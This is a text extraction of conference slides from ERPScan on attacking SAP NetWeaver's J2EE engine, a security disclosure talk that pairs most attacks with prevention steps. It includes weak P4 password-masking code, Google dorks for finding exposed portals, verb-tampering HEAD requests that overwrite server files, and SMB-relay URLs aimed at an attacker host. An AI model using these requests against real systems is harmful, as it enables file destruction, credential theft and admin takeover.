Invest  in  security   to  secure  investments  
A  crushing  blow  at   the  heart  of  SAP's   J2EE  Engine.  
  
Alexander  Polyakov  ­  CTO  ERPScan  

Me  
· CTO  of  the  ERPScan  company   ·   Head  of  DSecRG  (research  subdivision)   ·   Architect    of    ERPScan  Security  Scanner  for  SAP   · OWASP--EAS  project  leader     · Business  applicaFon  security  expert  

Tweet:  @sh2kerr  
Love  circle  logo's  )  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

2  

ERPScan  

·   InnovaFve  company  engaged  in  ERP  security  R&D   ·   Part  of  Russian  group  of  companies  "Digital  Security"  founded  
in  2002   · Flagship  product  --  ERPScan  Security  Scanner  for  SAP   · Tools:  PentesFng  tool,  sapsploit,  web.xml  scanner   · ConsulFng   Services:   SAP   Pentest,   SAP   Assessment,   SAP   Code  
review  
  

Leading   SAP   AG   partner   in   the   field   of   discovering   security  
vulnerabiliMes    by  the  number  of  founded  vulnerabiliMes  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

3  

   · Intro   · SAP  J2EE  Architecture   · Simple  aWacks   · Round  1   · Round  2   · Round  3  Crushing  blow   · Defense   · Conclusion  

Agenda  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

4  

SAP?  Who  cares?  
· Most  popular  business  applicaFon   · More  than  120000  customers  worldwide     · 74%  Forbes  500  companies    run  SAP  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

5  

J2EE  Engine    
· AutomaFon   of   business   processes   like   ERP,   PLM,   CRM,   SRM   based  ABAP.  
·    IntegraFon,   collaboraFon   and   management   based   on   J2ee   engine:  
­ SAP  Portal     ­ SAP  PI(XI)   ­ SAP  Mobile  Infrastructure   ­ SAP  SoluMon  Manager  

Many  SAP  systems  don't  use  ABAP  stack  so  all   old  tricks  will  not  work  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

6  

J2EE  Engine    
· Administrators  and  developers  focused  on  ABAP  stack   · Pentesters  mostly  focused  on  ABAP  stack   · Researchers  mostly  focused  on  ABAP  stack   · GRC  consultants  focused  only  on    ABAP  stack    
It  is  becoming  more  secure  but....  
  

Hackers  know  about  it.  So  they  will  find  easier   ways  to  control  your  business!    

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

7  

J2EE  PlaWorm  Architecture        

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

8  

Security  
       Remote  control   AuthenMcaMon  
Data  Source   User  Management  
EncrypMon  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

9  

Remote  control  
· Visual  Admin  ­  old  and  powerful  administraFon  engine   · NWA  ­  Web--based  administraFon  of  J2EE  Engine   · J2EE  Telnet  ­can  be  used  to  perform  some  administraFon  tasks  
           There  are  also  more  tools  that           can  be  used  for  remote  management           but  they  use  ether  HTTP  or  P4  or  telnet  rotocol    
       

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

10  

AuthenMcaMon  
· DeclaraMve  authenMcaMon:  The  Web  container  (J2EE  Engine)   handles  authenFcaFon  
· ProgrammaMc  authenMcaMon.  Components  running  on  the  J2EE   Engine  authenFcate  directly  against  the  User  Management   Engine  (UME)  using  the  UME  API.    
            Web  Dynpro,  Portal  iViews      =    programmaFc     J2EE  Web  applicaFons                    =  declaraFve  or  programmaFc  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

11  

Declara2ve  authen2ca2on      

  

  

<security--constraint>   <web--resource--collecFon>  

  

<web--resource--name>Restrictedaccess</web--resource-- name>  

  

<url--paWern>/admin/*</url--paWern>  

<hWp--method>DELETE</hWp--method>  

  

</web--resource--collecFon>  

     <auth--constraint>  

  

           <role--name>admin</role--name>  

  

     </auth--constraint>   </security--constraint>  

  

  

WEB.XML  file  is  stored  in  WEB--INF  directory  of  applicaFon  root.  

  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

12  

Data  Source  

· Database  only  data  source.  All  master  data  stored  in  the   database  of  the  SAP  Web  ApplicaFon  Server  Java.  Intended  for   small  environment.  
· LDAP  Directory  data  source.    Can  be  read--only  or  writable.  This   opAon  is  rare  due  to  our  pracFce.[6]  
· ABAP--based  data  source.  All  users'  data  is  stored  in  some  SAP   NetWeaver  ABAP  engine.    Usually  it  is  done  by  using   communicaFon  user  SAPJSF_<SID>.  

  User  SAPJSF  can  have  2  different  roles  :  

  SAP_BC_JSF_COMMUNICATION_RO  

  SAP_BC_JSF_COMMUNICATION  

  

  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

13  

User  Management  
· UME  --  User  management  engine.    Using  UME  you  can  manage   all  user  data  thought  web  interface.   hWp://server:port/useradmin    
· Visual  Admin.    Using  Visual  Admin  you  can  manage  all  user  data   thought  P4  protocol.    
· SPML.    Service  Provisioning  Markup  Language  (SPML)  --  new   unified  interface  for  managing  UME   hWp://server:port/spml/spmlservice  
· Other          

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

14  

EncrypMon  

Service  Name  
HTTP   HTTP  over  SSL   IIOP   IIOP  IniFal  Context   IIOP  over  SSL   P4   P4  over  HTTP   P4  over  SSL   Telnet   LogViewer  control   JMS  

Port  Number  
5NN00   5NN01   5NN07   5NN02   5NN03   5NN04   5NN05   5NN06   5NN08   5NN09   5NN10  

Default  Value  
50000   50001   50007   50002   50003   50004   50005   50006   50008   50009   50010  

Range  (min--max)  
50000--59900   50001--59901   50007--59907   50002--59902   50003--59903   50004--59904   50005--59905   50006--59906   50008--59908   50009--59909   50010--59910  

By  default  all  encrypFon  on  all  ports  and  protocols  is  disabled    

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

15  

Hacking  SAP  NetWeaver  J2EE    

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

16  

SAP  NetWeaver  J2EE  for  acacker's  
  

· Open  ports    

    --  for  internal  aWacks  

· Web  applicaFons     --  for  internal  and  external    

  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

17  

Insecure  password  encrypMon  in  P4  
· P4  ­  protocol  which  is  using  by    Visual  Admin   · By  default  data  transmiWed  in  cleartext   · But  password  is  encrypted         Lets  look  deeper         

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

18  

Hacking  SAP  NetWeaver  J2EE    

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

19  

Insecure  password  encrypMon  in  P4  
· EncrypFon  (masking),  not  the  hash     · Secret  key  is  staFc     · Key  potenFally  stored  on  server   · Length  of  encrypted  password  depends  on  password  length   · Value  of  encrypted  symbols  depends  on  previous  symbols  
             
Looks  like  some  kind  of  base64    

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

20  

Insecure  password  encrypMon  in  P4  
· /*  87  */  char  mask  =  43690;   /*  88  */  char  check  =  21845;   /*  89  */  char[]  result  =  new  char[data.length  +  1];   /*  */     /*  91  */  for  (int  i  =  0;  i  <  data.length;  ++i)  {   /*  92  */  mask  =  (char)(mask  ^  data[i]);   /*  93  */  result[i]  =  mask;   /*  */  }   /*  95  */  result[data.length]  =  (char)(mask  ^  check);   /*  */     /*  97  */  return  result;  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

21  

DEMO  
        
Impress  me  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

22  

Acacking  from  the  internet  
             

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

23  

Founding  a  target    
   inurl:/irj/portal     inurl:/IciEventService  sap   inurl:/IciEventService/IciEventConf   inurl:/wsnavigator/jsps/test.jsp   inurl:/irj/go/km/docs/       
  

Google  helps  us  again  )  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

24  

Informa2on  disclose  

· Kernel  or  applicaFon  release  and  SP  version.          DSECRG--11--023,DSECRG--11--027,  DSECRG--00208  
  
· ApplicaFon  logs  and  traces          DSECRG--00191,DSECRG--00232  
  
· Username          DSECRG--00231  
  
· Internal  port  scanning,  Internal  User  bruteforce          DSECRG--00197,DSECRG--00175  
  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

25  

DSECRG--11--023  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

26  

DSECRG--11--027  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

27  

PrevenMon  
·      Install  SAP  notes  1548548,1545883   ·      Update  the  latest  SAP  notes  every  month   ·      Disable  unnecessary  applicaFons  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

28  

XSS  
· 20.06.2011  [DSECRG--11--024  ]  SAP  NetWeaver  performance  Provier  Root  --  XSS      20.06.2011  [DSECRG--11--025  ]  SAP  NetWeaver  Trust  Center  Service  --  XSS      12.04.2011  [DSECRG--11--016]  SAP  NetWeaver  Data  Archiving  Service  --  mulFple  XSS      12.04.2011  [DSECRG--11--015]  SAP  NetWeaver  MessagingServer  --  XSS      14.03.2011  [DSECRG--11--013]  SAP  NetWeaver  RunFme  --  mulFple  XSS      14.03.2011  [DSECRG--11--012]  SAP  NetWeaver  IntegraFon  Directory  --  mulFple  XSS      14.03.2011  [DSECRG--11--011]  SAP  Crystal  Reports  2008  --  MulFple  XSS      14.03.2011  [DSECRG--11--010]  SAP  NetWeaver  logon.html  --  XSS      14.03.2011  [DSECRG--11--009]  SAP  NetWeaver  XI  SOAP  Adapter  --  XSS        14.12.2010  [DSECRG--09--067]  SAP  NetWeaver  DTR  --  MulFple  XSS      14.12.2010  [DSECRG--10--009]  SAP  NetWeaver  ExchangeProfile  --  XSS      14.12.2010  [DSECRG--10--008]  SAP  NetWaver  JPR  Proxy  Server  --  MulFple  XSS      14.12.2010  [DSECRG--10--007]  SAP  NetWeaver  Component  Build  Service  --  XSS      11.11.2010  [DSECRG--09--056]  SAP  Netweaver  SQL  Monitors  --  MulFple  XSS  
And  about    100  vulnerabiliFes  more  are  sFll  patching          

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

29  

PrevenMon  
·      Update  the  latest  SAP  notes   ·      Disable  unnecessary  applicaFons   ·      Set  service  property  SystemCookiesDataProtecFon  to  true.  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

30  

SMBRelay  

  

  

  

  ApplicaFon  MMR  (Meta  Model  Repository)    

· You  can  get  shell  with  administrator  rights   · Server  OS  updates  rarely  on  SAP  systems   · You  can  relay  to  other  node  of  cluster   · You  can  relay  from  DEV  to  TST  (usually  have  the  same  password)  

  
hWp://server:port/mmr/MMR?filename=\\smbsniffer\anyfile  
     
       

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

31  

PrevenMon  
·      Update  the  latest  SAP  notes   ·      Disable  unnecessary  applicaFons   ·      Enable  authorizaFon  checks  where  they  are  necessary     ·      For  developers:  limit  access  only  for  local  system  and  also           by  directory  and  file  type  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

32  

CSRF  +    SmbRelay    =  CSSR  
ApplicaFon  MMR  (Meta  Model  Repository)     Patched  by  limiFng  access.        
Just  send  this  link  to  admin  =  CSRF  +  SmbRelay  =  CSSR   Or  inject  with  XSS  into  Portal  =  XSS  +  SmbRealy  =  XSSR  
   hWp://server:port/mmr/MMR?filename=\\smbsniffer\anyfile  
  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

33  

PrevenMon  
·      Update  the  latest  sapnotes   ·      Disable  unnecessary  applicaFons   ·      Enable  SAP  CSRF  protecFon  API  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

34  

  CSRF  protec2on  
   · Standard  XSRF  ProtecMon.  Framework  generates  XSRF  token,  
applies  either  to  POST--based  or  GET--based  encoding,  and   validates  the  correctness  of  the  subsequent  requests.   · Custom  CSRF  ProtecMon.  Framework  generates  and  provides  an   XSRF  token  to  the  applicaFon  through  the  XSRF  ProtecFon  API.     The  only  way  if  you  want  to  protect  something  different  from   standard  GET/POST  requests.    

  Standard  XSRF  ProtecFon  is  recommended  
  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

35  

CSRF  protec2on  bypass  
     · Need  to  find  a  place  where  CSRF  protecFon  is  impossible   · There  must  be  a  place  without  session  management   · Something  like  remote  API     · Like  SOAP  API  .....     

HINT:  SAP  have  all  but  you  need  to  find  it  (c)  DSecRG    

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

36  

Holy  Graal    of  user  management  
                SPML  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

37  

SPML  Architecture  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

38  

SPML  Ac2ons  
          Using  SPML  you  can  do  all  the  things  that  can  be  done  using   IdenAty  management  API  like:  
      ·          CreaFng  objects  (except  sap  roles)   ·            Modifying  objects  (users,  roles,  groups)   ·            Searching  for  objects   ·            DeleFng  object  

But  you  need  to  have  UME  acFons  UME.Spml_Read_AcFon  and   UME.Spml_Write_AcFon  ............  or?  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

39  

AGacking  SPML  
   · Create  html  page  that  will  send  xmlhWp  request  to  SPML   · Found    XSS  in  SAP   · Wait  unFl  administrator  clicks  it   · PROFIT!  
*Example  of  SOAP  request  is  in  the  whitepaper  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

40  

PrevenMon  
·        Limit  access  to  SPML  only  for  Administrators  or  IDM  servers  subnet    
·        Assign  SPML  administraFon  roles  only  to  a  small  amount  of  users   ·        Disable  SPML  if  it  is  not  used   ·        Update  the  latest  SAP  notes  about  XSS  vulnerabiliFes    

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

41  

I  want  more!  
·        
I  Came  here  with  a   simple  dream.........   A  dream  of  owning  all   SAPs  Using  one  bug    

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

42  

And  I  found  it.......    
               Verb  Tampering       

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

43  

And  I  found  it.......    

Verb  Tampering  is  a  dark  horse  described  by  Arshan  Dabirsiaghi  in   2008  which  doesn't  have  many  known    examples  unAl  now     
· Must  use  security  control  that  lists  HTTP  verbs  (DONE)     · Security  control  fails  to  block  verbs  that  are  not  listed  (DONE)   · GET  funcFonality  will  execute  with  an  HEAD  verb  (DONE)  
     SAP  NetWeaver  J2EE  engine  has  all  that  features  !!!!           

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

44  

But!  
But  the  problem  was  that  I  need  to  find  a  needle  in    more  than  500   different  applicaFons  
   · ApplicaFon  must  miss  HEAD  check  in  WEB.XML   · ApplicaFon  must  execute  HEAD  as  GET   · Request  must  do  some  acFon  that  doesn't  need  to  return  result     · Request  must  do  some  really  criFcal  acFon   · PotenFally  about  40  applicaFons  are  vulnerable     

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

45  

Round  1  

When  I  was  totally  despired..........................        

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

46  

1    --  unauthorized  DOS  

      · IntegraFon  Directory  applicaFon     · Can  be  used  to  overwrite  any  OS  file  with  trash  values   ·   for  example  it  can  be  exploited  to  overwrite  profile  parameter  

              HEAD  /dir/support/CheckService?cmd_check&fileNameL=DEFAULT1.PFL&             directoryNameL=D:\usr\sap\DM0\SYS\profile  HTTP/1.0     
It  means  that  aWacker  can  overwrite  ANY  file  of  SAP  server   remotely  thought  the  Internet  and  it  is  doesn't  depend  on  
version  of  SAP  applicaFon  or  operaFon  system    

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

47  

Round  2  

When  I  was  totally  despired..........................        

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

48  

2    --  unauthorized  smbrelay  (VTSR)  

   · Same  vulnerability  but  other  vector  
­ Verb  Tampering  +SmbRelay  =  VTSR    
· Can  be  used  for  SMBrelay  aWack  and  full  access  to  OS     · Unfortunately  only  on  windows  
HEAD  /dir/support/CheckService?cmd_check&fileNameL=file&             directoryNameL=\\smbsniffer\sniff\  HTTP/1.0     
It  means  that  aWacker  get  administraFve  access  to  SAP  on   Windows  server  on  local  subnet.      

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

49  

Mred  

When  I  was  totally  despaired..........................        

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

50  

3  ­  unauthorized  group  assignment  

· Secret  interface  which  connect  JAVA  and  ABAP   · Can   interact   using   JCO(RFC)   and   run   user   management  
acFons   · C o n n e c F o n    i s    d o n e    u s i n g    S A P P J S F    u s e r  
(SAP_JSF_COMMUNICATION)   · Can  be  accessed  remotely  but  there's  no  documentaFon   · Many  commands  were  found  but  almost  all  require  username  
and  password  addiFonally   · Except  one  ))  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

51  

3  ­  unauthorized  group  assignment  

· It  is  possible  to  add  any  user  to  any  group  
· For  example  you  can  add  guest  user  to  group  Administrators   which  will  lead  to  total  destrucFon  in  public  Portals.  
· Work   when   ABAP   engine   is   a   data   store   for   J2EE   and   connecFon  using    SAP_JSF_COMMUNICATION  
· SFll  patching    

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

52  

4  ­  total  remote  control  
   I   was   thinking   that   this   is   a   win   ....   unAl   we   got   a   contract   for   pen  tesAng  SAP  Portal  (hope  next  talk  Will  be  )  and  found  more   epic  things:      · Vulnerability  is  working  in  the  real  life  !   · In   Standalone   J2EE   engine   it   is   possible   to   do   everything   using   this  applicaFon.   · By  simply  sending  2  requests  you  can  create  new  user  and  map   him  to  group  Administrators.  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

53  

DEMO  

  
  

Show    me  DEMO!!!!!  

  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

54  

A  crushing  blow  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

55  

PrevenMon  
·        Scan  applicaFons  using  ERPScan  WEB.XML  check  tool  or   manually   ·        Disable  unnecessary  services  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

56  

Defense  
· SAP  opFons  for  protecFng  from  almost  all  possible  aWacks   · But  the  number  of  problems  is  huge   · But  the  systems  are  very  complex   · But  administrators  don't  care  
  

We  tried  to  help  a  liVle  bit    

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

57  

ERPSCAN  WEB.XML  check  tool  
·   Developed  by  EPPScan     · Part  of  the  commercial  Security  Scanner   · Can  be  downloaded  offline  for  free   · Intended  to  checking  WEB.XML  files  for  different  vulnerabiliFes  
and  missconfiguraFons   · Will  be  also  published  at  OWASP--EAS  project  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

58  

ERPSCAN  WEB.XML  check  tool  

· (1)  InformaMon  disclose  through  error  code.  Checking  for  <error-- page>  
· (2)  Auth  bypass  through  verb  tampering.  Checking  for  <security-- constraint>.    
· (3)  Intercept  criMcal  data  through  lack  of  SSL  encrypFon  for  data   transfer.  Checking  for  <transport--guarantee>  
· (4)  Cookie  stealing  thought  lack  of  SSL  for  an  authorizaFon  .  Checking   for  <session--config>  
· (5)  Cookie  stealing  through  XSS.  Checking  for  HWponly=true  
· (6)  Session  stealing  when  JSESSIONID  are  not  in  Cookie.  Checking  for   <tracking--mode>COOKIE</tracking--mode>,  
· (7)  Increased  CSRF  or  XSS  probability  with  big  session  Fmeout.   Checking  for  <session--config>    
· (8)  Unauthorized  acMons  by  locally  enabled  invoker  servlets.  
            Checking  for  <param>InvokerServletLocallyEnabled</param>.    

  erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

59  

        
  Look  at  my    
  TOOL  

Tool  DEMO  

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

60  

Conclusion  
· For  companies  --    It  is  just  the  beginning     · For  researchers    --  Work  hard  and  you  will  get  what  you  want   · For  pentesters  ­  now  you  can  hack  SAP  J2EE   · For  SAP  developers  ­  please  read  SAP's  recommendaFons   · For  GRC  guys  ­    security  is  not  only  SOD     · For  Administrators  --    read,  patch,  config,  read,  patch,  config,....or  
ask  professionals  ))     

erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

61  

Future  work  

  Many  of  the  researched  things  cant  be  disclosed  now  because  of   good   relaAonship   with   SAP   Security   Response   Team   which   I   would  like  to  thank  for  cooperaAon.  However  if  you  want  to  see   new   demos   and   0--days   follow   us   at   @erpscan   and   aVend     feature  presentaAons:  

  

· 6  September  Bangalore  India  at  Securitybyte  

· 19  September  --  Brussels  Belgium  at  Brucon  

· 25  October  --  Miami  USA  at  HackerHalted  

· TBA  

  

     Look  at  dsecrg.com  and  erpscan.com  for  news  

  

  erpscan.com  

ERPScan  --  invest  in  security  to  secure  investments  

62  

Please Remember to Complete Your Feedback
Form

